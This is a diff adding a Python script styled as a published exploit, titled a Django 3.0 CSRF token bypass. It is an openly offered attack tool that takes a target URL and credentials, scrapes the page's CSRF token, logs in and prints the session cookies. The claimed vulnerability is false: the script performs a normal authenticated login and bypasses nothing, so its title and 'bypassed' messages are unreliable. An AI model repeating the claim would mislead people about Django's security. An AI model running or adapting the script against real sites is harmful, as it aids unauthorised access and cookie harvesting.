@@ -1,0 +1,111 @@
+# Exploit Title: Django 3.0 - Cross-Site Request Forgery Token Bypass
+# Date: 2020-04-08
+# Exploit Author: Spad Security Group
+# Vendor Homepage: https://www.djangoproject.com/
+# Software Link: https://pypi.org/project/Django/
+# Version: 3.0 =<
+# Tested on: windows 10
+# Language: python3.8
+
+# t.me/SpadSec
+# Spad Security Group
+
+
+from requests import Session
+import sys
+from bs4 import BeautifulSoup
+from time import sleep
+from colorama import Fore, Style
+from random import choice
+from os import name, system
+
+colors = [Fore.RED, Fore.BLUE, Fore.WHITE, Fore.GREEN, Fore.CYAN, Fore.YELLOW]
+
+
+def cleaner():
+    if name == "nt":
+        system("cls")
+    else:
+        system("clear")
+
+def logo_printer():
+    cleaner()
+    logo = r"""
+     \_______/
+ `.,-'\_____/`-.,'
+  /`..'\ _ /`.,'\
+ /  /`.,' `.,'\  \
+/__/__/     \__\__\__
+\  \  \     /  /  /
+ \  \,'`._,'`./  /
+  \,'`./___\,'`./
+ ,'`-./_____\,-'`.
+     /       \
+    """
+    _logo_enumer = 0
+    for char in logo:
+        sys.stdout.write(f"{choice(colors)}{char}{Style.RESET_ALL}")
+        sys.stdout.flush()
+        _logo_enumer +=1
+        sleep(0.005)
+    print(f"{colors[4]}DjangoCsrfMiddlewareToken bypass by SpadSecurity Group \n{colors[3]}\tt.me/SpadSec")
+
+class DjangoCsrfMiddleWareBypass:
+    def __init__(self, url: str, username: str, password: str):
+        self.url = url
+        self.username = username
+        self.password = password
+        logo_printer()
+        self.cookies = {}
+        self.session = Session()
+        self.bypass()
+    
+    def spad_printer(self, string):
+        print("\n")
+        for char in string:
+            sys.stdout.write(char)
+            sys.stdout.flush()
+            sleep(0.05)
+
+    def bypass(self):
+        global colors
+        _conn = self.session.get(self.url)
+        self.spad_printer(f"{colors[5]}[{colors[0]}x{colors[5]}] {colors[4]}Target: {colors[3]}{self.url}")
+        self.spad_printer(f"{colors[5]}[{colors[0]}+{colors[5]}] {colors[1]}Trying to bypass cookies ...")
+        for key, value in _conn.cookies.items():
+            self.cookies[key] = value
+        self.spad_printer(f"{colors[5]}[{colors[0]}+{colors[5]}] {colors[1]}Bypassed Cookies ;)!")
+
+        soup = BeautifulSoup(_conn.text, "lxml")
+        csrf = soup.find('input', {'name': 'csrfmiddlewaretoken'})['value']
+        self.spad_printer(f"{colors[5]}[{colors[0]}~{colors[5]}] {colors[1]}Csrf-Token Found{Style.RESET_ALL}")
+
+        login = self.session.post(self.url, data={'csrfmiddlewaretoken': csrf, 'username': self.username, 'password': self.password}, cookies=self.cookies)
+        if len(login.history) >= 2:
+            if login.history[1].is_redirect:
+                self.spad_printer(f"{colors[5]}[{colors[0]}+{colors[5]}] {colors[1]}Csrf-Token bypassed and logged in")
+            else:
+                self.spad_printer("[-] Error")
+        else:
+            if login.history:
+                if login.history[0].is_redirect:
+                    self.spad_printer(f"{colors[5]}[{colors[0]}+{colors[5]}] {colors[1]}Csrf-Token bypassed and logged in{Style.RESET_ALL}")
+                    for key, value in self.session.cookies.items():
+                        self.spad_printer(f"{colors[5]}[{colors[0]}!{colors[5]}] {colors[4]}{key} {colors[1]}-> {colors[4]}{value}{Style.RESET_ALL}")
+                else:
+                    self.spad_printer(f"{colors[5]}[{colors[0]}-{colors[5]}] {colors[1]}Error")
+            else:
+                self.spad_printer(f"{colors[5]}[{colors[0]}-{colors[5]}] {colors[1]}Error")
+
+if __name__ == "__main__":
+    try:
+        url = sys.argv[1]
+        username = sys.argv[2]
+        password = sys.argv[3]
+        DjangoCsrfMiddleWareBypass(url, username, password)
+    except IndexError:
+        logo_printer()
+        for char in f"[!] python {sys.argv[0]} http://google.com username password":
+            sys.stdout.write(char)
+            sys.stdout.flush()
+            sleep(0.05)
